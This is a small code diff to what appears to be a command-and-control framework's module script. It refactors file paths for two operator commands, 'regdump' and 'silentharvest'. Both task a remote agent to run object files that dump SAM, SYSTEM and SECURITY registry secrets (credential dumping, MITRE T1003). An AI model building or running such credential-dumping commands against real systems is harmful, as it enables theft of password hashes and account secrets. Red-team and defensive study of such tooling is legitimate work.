@@ -1,5 +1,7 @@
 import conquest
-import os.path 
+import os.path
+
+SCRIPT_DIR = os.path.dirname(__file__)
 
 cmd_regdump = (
     conquest.createCommand(name="regdump", description="Dump SAM, SYSTEM and SECURITY from the Windows registry.", example="regdump C:\\Windows\\Tasks",
@@ -8,7 +10,7 @@ cmd_regdump = (
             .setHandler(lambda agentId, cmdline, args: (
                 path := conquest.get_string(args, 0),
 
-                bof := conquest.modules_root() + "/credential-dumping/regdump/regdump.x64.o",
+                bof := os.path.join(SCRIPT_DIR, "regdump/regdump.x64.o"),
                 params := conquest.bof_pack("z", [
                     path         # z: Output path
                 ]),
@@ -24,7 +26,7 @@ cmd_silentharvest = (
     conquest.createCommand(name="silentharvest", description="Gather SAM and SECURITY secrets using the SilentHarvest method of dumping registry values.", example="silentharvest",
                            message="Tasked agent to gather SAM and SECURITY secrets using the SilentHarvest method of dumping registry values.", mitre=["T1003"])
             .setHandler(lambda agentId, cmdline, args: (
-                bof := conquest.modules_root() + "/credential-dumping/SilentHarvest_BOF/dist/silentharvest.x64.o",
+                bof := os.path.join(SCRIPT_DIR, "SilentHarvest_BOF/dist/silentharvest.x64.o"),
                 conquest.execute_alias(agentId, cmdline, f"bof {bof}") if os.path.exists(bof)
                 else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
             ))
